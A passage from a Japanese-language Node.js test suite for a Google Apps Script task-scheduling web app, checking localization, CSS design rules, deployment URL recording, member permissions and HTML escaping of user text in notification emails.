  ok('出力するスプレッドシートは、ファイル名・フォルダ名・シート名・見出し・決まった言い回しのセルが、その言語になる（日本語が残らない）', !JA.test(x.name) && /^Daily data \d{4}-\d{2}-\d{2} \((Sun|Mon|Tue|Wed|Thu|Fri|Sat)\) - Maintenance$/.test(x.name) && !e.drive.some(q => q.folder && JA.test(q.name)) && cells.filter(c => JA.test(c)).length === 0 && cells.indexOf(dicts.en['メンバー別']) >= 0 && cells.indexOf('Alice') >= 0);
  const sm = a2.openSummary();
  ok('稼働リストも、その言語で作れる（サマリーつき）', sm.pivot === true && sm.notes.length === 0 && !Object.keys(e.books[e.props.SUM_FILE]._sheets).some(k => JA.test(k)));
  ok('スプレッドシートに入っているデータ（タスクの状態など）は、言語によらず同じ形', e.sheets.tasks._d[1][e.sheets.tasks._d[0].indexOf('status')] === 'done' && e.sheets.tasks._d[0].indexOf('title') >= 0);
  ok('文の中の言い回しも置き換える（日付・単位・かっこの形を直す）', e.ctxT('11月17日') === '11/17' && e.ctxT('2026年11月') === '2026/11' && e.ctxT('火') === dicts.en['火'] && !JA.test(e.ctxT('約 15 分の遅延')) && e.ctxT('Alice（2 件）') === 'Alice (2)' && e.ctxT('plain text') === 'plain text');
  { a2.exportBoard({ day: '', span: 'month' }); const bk = e.books[Object.keys(e.books).pop()];
    const heads = bk.getSheets().map(sh => sh.getDataRange().getValues()[0]);
    ok('英語の出力では、表の見出しに空の欄がない（曜日の列にも見出しが付く）', heads.length === 3 && heads.every(h => h.every(c => String(c).trim() !== '')) && heads.some(h => h.indexOf('Weekday') >= 0), JSON.stringify(heads).slice(0, 300)); }
  a2.resetProject();
  ok('リセットすると、言語の設定も消える（始め直すときに、もう一度選べる）', e.props.LANG === undefined && JSON.parse(a2.doGet({ parameter: {} }).boot).langs !== null);
  st = a2.initProject({ name: 'テスト', lang: 'fr' });
  ok('一覧にない言語（訳はあるが、まだ出していないフランス語など）を渡されたら、日本語で始める', e.props.LANG === undefined && JSON.parse(a2.doGet({ parameter: {} }).boot).lang === 'ja');
  const n2 = e.mails.length; a2.addMember({ email: 'sato@example.com', name: '佐藤', board: '' });
  a2.createTask({ title: '点検', member: 'sato@example.com', start: at(9), end: at(10) });
  ok('日本語のプロジェクトは、これまでどおり（メールは日本語、対訳は付かない）', e.mails.slice(n2).some(q => /^割り当て: 点検/.test(q.subject)) && JSON.parse(a2.doGet({ parameter: {} }).boot).dict === null);
}

// 見た目の基準: スタイルと画面の中の指定が、基準から外れていないことを機械的に確かめる
{
  const html = require('fs').readFileSync(__dirname + '/../src/index.html', 'utf8');
  const css = html.slice(html.indexOf('<style>'), html.indexOf('</style>'));
  ok('背景はどの画面も白、カードも白', /--ground:#FFFFFF;--surface:#FFFFFF/.test(css));
  ok('テーマの紺（#1F2E38）が、ボタン・選択の色になっている', /--primary:#1F2E38;/.test(css));
  ok('ボードの色は、画面とサーバーで同じ 6 色', (() => { const a = html.match(/const PALETTE = (\[[^\]]+\])/)[1], b = require('fs').readFileSync(__dirname + '/../src/Code.gs', 'utf8').match(/const PALETTE = (\[[^\]]+\])/)[1]; return a === b && JSON.parse(a.replace(/'/g, '"')).length === 6; })());
  // 言葉づかい（「終わりの日」「〜ときは」のような言い回しは使わない。業務の道具らしい言葉にそろえる）
  {
    const strip = (text) => text.split('\n').filter(l => !/^\s*(\/\/|\*|\/\*)/.test(l)).map(l => l.replace(/\s\/\/\s.*$/, '').replace(/\/\*.*?\*\//g, '')).join('\n');
    const lit = (text) => (strip(text).match(/'(?:[^'\\\n]|\\.)*'|"(?:[^"\\\n]|\\.)*"/g) || []).filter(x => /[ぁ-んァ-ヶ一-龥]/.test(x));
    const words = lit(html.slice(html.indexOf('<script>'))).concat(lit(require('fs').readFileSync(__dirname + '/../src/Code.gs', 'utf8')));
    const BAN = /終わりの日|始まりの日|ときは|ときだけ|入れてください|選んでください|付けてください|送れま|読めま|作れま|取れま|足せま|移せま|使えま|消えま|まだありません|まだです|初めの値|見張り|作り直|送り直|開き直|知らせる|(?<!取り)消す|外す|移す|探す|選ぶ|はじめる|いちばん|もう一度|少し待って|日報|週報|月報|書き出/;
    const hits = words.filter(x => BAN.test(x));
    ok('画面とメールの文言に、決めた言葉づかいから外れた言い回しがない' + (hits.length ? ' → ' + hits.slice(0, 40).join(' | ') : ''), hits.length === 0);
  }
  ok('グラデーション・色つきの発光を使っていない', !/gradient\(|text-shadow/.test(html));
  ok('12px より小さい文字がない', !/font-size:\s*(\d|10|11)px/.test(html));
  // 文字の大きさ（直書きしない。多くても 4〜5 種類。スマホでの調整も変数で）
  {
    const defs = css.match(/--fs-(?:xs|sm|md|lg|xl):\d+px/g) || [];
    const used = html.match(/font-size:[^;}'"]+/g) || [];
    const direct = used.filter(v => !/^font-size:var\(--fs-(xs|sm|md|lg|xl|input)\)$/.test(v));
    ok('文字の大きさは 5 段階の変数だけ（12・14・16・20・32px）。部品に px を直接書かない' + (direct.length ? ' → ' + direct.slice(0, 5).join(' | ') : ''), defs.join() === '--fs-xs:12px,--fs-sm:14px,--fs-md:16px,--fs-lg:20px,--fs-xl:32px' && direct.length === 0 && used.length > 50);
    const lh = (html.match(/line-height:[^;}'"]+/g) || []).filter(v => !/^line-height:(var\(--lh-(xs|sm|md|lg|xl)\)|1)$/.test(v));
    ok('行の高さも、同じ段階の変数だけ' + (lh.length ? ' → ' + lh.slice(0, 5).join(' | ') : ''), lh.length === 0 && /--lh-xs:16px;--lh-sm:20px;--lh-md:24px;--lh-lg:24px;--lh-xl:36px/.test(css));
    ok('スマホの幅での調整は、変数の差し替えで行う（入力欄は 16px）', /input,select,textarea\{font-size:var\(--fs-input\)\}/.test(css) && /@media \(max-width:520px\)\{:root\{--fs-input:var\(--fs-md\)\}\}/.test(css) && /--fs-input:1em/.test(css));
    const gs = require('fs').readFileSync(__dirname + '/../src/Code.gs', 'utf8');
    const mailDirect = (gs.match(/font-size:\d+px/g) || []);
    ok('メールの文字の大きさも、決めた段階（MAIL_FS）だけを使う', mailDirect.join() === 'font-size:12px,font-size:14px,font-size:16px,font-size:20px' && (gs.match(/MAIL_FS\.(xs|sm|md|lg)/g) || []).length >= 10);
  }
  const SCALE = [0, 2, 4, 8, 12, 16, 20, 24, 32, 40, 48, 64, 80, 96, 112, 128];
  const bad = [];
  (html.match(/(?:^|[;{'" ])(?:gap|padding(?:-(?:top|bottom|left|right))?|margin(?:-(?:top|bottom|left|right))?):[^;}'"]+/g) || []).forEach(d => {
    (d.match(/-?\d+(?:\.\d+)?px/g) || []).forEach(v => { if (SCALE.indexOf(Math.abs(parseFloat(v))) < 0) bad.push(d.trim()); });
  });
  ok('余白は 4px 刻みの値だけ' + (bad.length ? ' → ' + bad.slice(0, 5).join(' | ') : ''), bad.length === 0);
  const radii = (html.match(/border-radius:\s*[^;}'"]+/g) || []).map(r => r.replace(/border-radius:\s*/, '')).filter(r => ['2px', '4px', '6px', '8px', '10px', '12px', '16px', '20px', '28px', '50%', '999px'].indexOf(r) < 0);
  ok('角の丸みは決めた段階だけ' + (radii.length ? ' → ' + radii.join(' | ') : ''), radii.length === 0);
  ok('影は 2 種類の決めた値だけ（短く、色のない黒。ライトとダークで、それぞれ 2 種類）', !/rgba\(15,23,42/.test(html) && (css.match(/--shadow-[12]:/g) || []).length === 4 && !/\d{2,}px \d{2,}px rgba/.test(css.replace(/0 8px 24px/g, '')));
  ok('ボードの区切りの帯は、灰色の決め打ちではなくボードの色で塗る', !/\.bhead-[lr]\{[^}]*background/.test(css) && (html.match(/class: 'bhead-l', style: 'background:' \+ c/g) || []).length === 2);
}

// URL のシートと、シートの並び（デプロイの画面を閉じても、スプレッドシートを開けば URL が分かるように）
{
  const U1 = 'https://script.google.com/macros/s/AAA/exec', U2 = 'https://script.google.com/macros/s/BBB/exec';
  const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a = e.api; e.now = at(8, 0);
  e.book.insertSheet('Install'); e.book.insertSheet('導入手順'); // 雛形に入っている導入手順のシート
  const names = () => e.book.getSheets().map(sh => sh.getName());
  const cells = () => e.sheets.URL._d.map(r => r.join(' | ')).join('\n');
  e.url = 'https://script.google.com/macros/s/AAA/dev';
  a.authorize();
  ok('権限の承認のとき、URL のシートができて、いちばん左に並ぶ（導入手順はその次）', names().join() === 'URL,Install,導入手順' && e.sheets.URL._tab === '#1E8E3E' && e.sheets.Install._tab === '#2279B6' && e.sheets['導入手順']._tab === '#2279B6');
  ok('エディタから動かしたときの確認用の URL（…/dev）は書かない。確認方法を、英語と日本語で書く', !/\/dev/.test(cells()) && /Recorded here when you open the web app/.test(cells()) && /ウェブアプリを開くと、ここに記録されます/.test(cells()) && /Manage deployments/.test(cells()) && /デプロイを管理/.test(cells()) && e.props.URL_LIST === undefined, cells());
  e.url = U1; e.user = 'member@example.com';
  a.doGet({ parameter: {} });
  ok('デプロイした本人以外が開いても、URL は書かない', !/AAA/.test(cells()) && e.props.URL_LIST === undefined);
  e.user = 'admin@example.com';
  a.doGet({ parameter: {} });
  ok('デプロイした本人がウェブアプリを開くと、その URL が書かれる', e.sheets.URL._d[1][1] === U1 && JSON.parse(e.props.URL_LIST).length === 1, cells());
  const w0 = e.sheets.URL._d.length;
  a.initProject({ name: 'Video', lang: 'en' });
  ok('始めると、URL のシートは決めた言語だけになり、データのシートはその右に灰色で並ぶ', /^Web app URL \| /.test(e.sheets.URL._d[1].join(' | ')) && !/ウェブアプリ/.test(cells()) && e.sheets.URL._d.length < w0 && names().slice(0, 3).join() === 'URL,Install,導入手順' && names().length === 14 && e.sheets.tasks._tab === '#9AA0A6' && e.sheets.members._tab === '#9AA0A6', cells());
  e.now = at(9, 0); e.url = U2;
  a.doGet({ parameter: {} });
  ok('デプロイを増やして新しい URL で開くと、新しいものが上に、前のものが下に残る', e.sheets.URL._d[1][1] === U2 && /Previous URLs/.test(cells()) && e.sheets.URL._d[e.sheets.URL._d.length - 1][1] === U1 && JSON.parse(e.props.URL_LIST).map(x => x.u).join() === U2 + ',' + U1, cells());
  const snap = cells(); const n0 = e.reads.sheets;
  a.doGet({ parameter: {} });
  ok('同じ URL で開き直しても、書き直さない', cells() === snap && JSON.parse(e.props.URL_LIST).length === 2);
  e.user = 'member@example.com'; e.url = U1; a.doGet({ parameter: {} }); e.user = 'admin@example.com'; e.url = U2;
  ok('ほかの人が前の URL で開いても、上の URL は入れ替わらない', e.sheets.URL._d[1][1] === U2);
  a.resetProject();
  ok('リセットしても、URL のシートと導入手順のシートは残る', names().join() === 'URL,Install,導入手順' && e.sheets.URL._d[1][1] === U2);
  // スプレッドシートに書けなくても、ページは出る
  const e2 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); e2.now = at(8, 0); e2.noActive = 'throw';
  ok('スプレッドシートを取れないときも、ページは出る（URL のシートは作らない）', !!e2.api.doGet({ parameter: {} }).boot && !e2.sheets.URL);
}

// 公開前の点検で見つかったところ（v0.64）
{
  const mk = (owner) => { const e = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); if (owner) { e.owner = owner; e.user = owner; } e.now = at(8); return e; };
  // 外したメンバー・招待中の人は、前のタスクに名前が残っていても操作できない
  let e = mk(); let a = e.api; a.initProject({ name: '訪問サービス' });
  a.addMember({ email: 'sato@example.com', name: '佐藤', board: '' });
  let s1 = a.createTask({ title: '午前の訪問', member: 'sato@example.com', start: at(9), end: at(10) });
  const old = s1.tasks[0].id;
  e.now = at(12); a.removeMember('sato@example.com');
  ok('終わった時刻のタスクは、外したあとも担当の名前が残る', a.getState().tasks.filter(t => t.id === old)[0].member === 'sato@example.com');
  e.user = 'sato@example.com';
  const m0 = e.mails.length;
  throws('外したメンバーは、前のタスクを完了にできない', () => a.updateTask(old, 'done', {}), /担当ではありません/);
  throws('外したメンバーは、前のタスクを開始にできない', () => a.updateTask(old, 'start', {}), /担当ではありません/);
  throws('外したメンバーは、遅延の連絡を送れない', () => a.reportLate(old, { minutes: 5, note: 'x' }), /担当ではありません/);
  ok('管理者にメールは送られていない', e.mails.length === m0);
  e.user = 'admin@example.com'; e.autoJoin = false; a.addMember({ email: 'sato@example.com', name: '佐藤', board: '' });
  e.user = 'sato@example.com';
  ok('もう一度招待された人は、参加するまで「招待中」', a.getState().me.role === 'invited');
  throws('招待中の人も、前のタスクを操作できない', () => a.updateTask(old, 'done', {}), /担当ではありません/);
  a.joinProject({});
  ok('参加したら、また操作できる', a.updateTask(old, 'done', {}).tasks.filter(t => t.id === old)[0].status === 'done');

  // 画面に渡す、プロジェクトのタイムゾーンと、その日の終わり
  e.user = 'admin@example.com';
  const st = a.getState();
  ok('状態に、プロジェクトのタイムゾーンと、その日の終わりが入る', typeof st.tz === 'string' && st.tz.length > 0 && st.dayEnd > st.dayStart && st.dayEnd - st.dayStart >= 23 * 3600000 && st.dayEnd - st.dayStart <= 25 * 3600000);

  // 確認の表示（?debug=1）は、だれか分かっている人にだけ出す（メンバーが位置情報の取れ方を確かめるのに使う。出るのは本人の情報だけ）
  ok('管理者には、確認の表示の合図が入る', JSON.parse(a.doGet({ parameter: { debug: '1' } }).boot).debug === true);
  e.user = 'sato@example.com';
  ok('メンバーにも入る（本人の情報だけが出る）', JSON.parse(a.doGet({ parameter: { debug: '1' } }).boot).debug === true);
  e.user = '';
  ok('だれか分からない人にも入らない', JSON.parse(a.doGet({ parameter: { debug: '1' } }).boot).debug === false);

  // だれでも取れるメールのドメインは、同じドメインでも「同じ組織」にしない
  e = mk('owner@yahoo.co.jp'); a = e.api; a.initProject({ name: 'x' });
  e.autoJoin = false; a.addMember({ email: 'friend@yahoo.co.jp', name: '友人', board: '' });
  const inv = a.getState().invited[0];
  ok('公開した人が yahoo.co.jp のとき、同じドメインの人も「組織の外」として鍵つきのリンクになる', inv.outside === true && /[?&]k=/.test(inv.link));
  throws('その人を管理者にはできない', () => { e.autoJoin = true; e.user = ''; a.joinProject({ key: inv.link.split('k=')[1] }); e.user = 'owner@yahoo.co.jp'; a.updateMember('friend@yahoo.co.jp', { name: '友人', role: 'admin', board: '' }); }, /同じ組織/);
  e = mk('owner@corp.example'); a = e.api; a.initProject({ name: 'x' });
  e.autoJoin = false; a.addMember({ email: 'staff@corp.example', name: '社員', board: '' });
  ok('組織のドメインの人は、これまでどおり Google アカウントで見分ける（鍵は付けない）', a.getState().invited[0].outside === false && !/[?&]k=/.test(a.getState().invited[0].link));

  // ほかの言語のプロジェクトでも、利用者が入れた文字は、メールの中で書き換えない
  e = mk(); a = e.api; a.initProject({ name: '完了チーム', lang: 'en' });
  a.addMember({ email: 'sato@example.com', name: '管理者 太郎', board: '' });
  const n0 = e.mails.length;
  a.createTask({ title: '削除', member: 'sato@example.com', start: at(9), end: at(10), memo: '3時間後に5分休憩', address: '東京都港区（変更）' });
  const am = e.mails[n0];
  const html = am.options && am.options.htmlBody || '';
  ok('英語のプロジェクトの割り当てのメール: 件名の決まった言い回しは英語、タスク名とメンバー名はそのまま', /^Assigned: 削除 /.test(am.subject) && am.subject.indexOf('管理者 太郎') >= 0);
  ok('本文のメモ・住所も、そのまま（「3時間後に5分休憩」が「3 h…」にならない）', am.body.indexOf('3時間後に5分休憩') >= 0 && am.body.indexOf('東京都港区（変更）') >= 0 && html.indexOf('3時間後に5分休憩') >= 0 && html.indexOf('東京都港区（変更）') >= 0 && html.indexOf('>削除<') >= 0);
  ok('プロジェクト名も、そのまま', html.indexOf('完了チーム') >= 0);
  ok('決まった言い回し（見出し・ボタン）は、英語になっている', !/メモ|住所|タスクを開く/.test(am.body + html));
  e.user = 'sato@example.com';
  const n1 = e.mails.length;
  a.reportLate(a.getState().tasks[0].id, { minutes: 10, note: '電車の遅延' });
  ok('遅延の連絡のメールでも、メモはそのまま', e.mails.length === n1 + 1 && e.mails[n1].body.indexOf('電車の遅延') >= 0 && e.mails[n1].subject.indexOf('削除') >= 0);
  ok('どのメールにも、しるしの文字は残らない', e.mails.every(m => !/[]/.test(m.subject + m.body + (m.options && m.options.htmlBody || '') + (m.raw || ''))));
  // 利用者の文字に、しるしの文字そのものが入っていても、外にはみ出さない
  e.user = 'admin@example.com';
  a.createTask({ title: 'x<b>完了</b>y', member: 'sato@example.com', start: at(13), end: at(14) });
  const last = e.mails[e.mails.length - 1];
  ok('しるしの文字を入れても、HTML は壊れず、中身は書き換わらない', last.options.htmlBody.indexOf('x&lt;b&gt;完了&lt;/b&gt;y') >= 0 && !/[]/.test(last.subject + last.options.htmlBody));
  // 日本語のプロジェクトは、これまでどおり
  e = mk(); a = e.api; a.initProject({ name: '訪問サービス' });
  a.addMember({ email: 'sato@example.com', name: '佐藤', board: '' });
  a.createTask({ title: '訪問', member: 'sato@example.com', start: at(9), end: at(10), memo: 'メモの中身' });
  const jm = e.mails[e.mails.length - 1];
  ok('日本語のプロジェクトのメールは、これまでどおり（しるしも残らない）', /^割り当て: 訪問 9:00–10:00（佐藤）$/.test(jm.subject) && jm.body.indexOf('メモ: メモの中身') >= 0 && !/[]/.test(jm.subject + jm.body + jm.options.htmlBody));
}

console.log(`\n${pass} passed, ${fail} failed`); process.exit(fail ? 1 : 0);
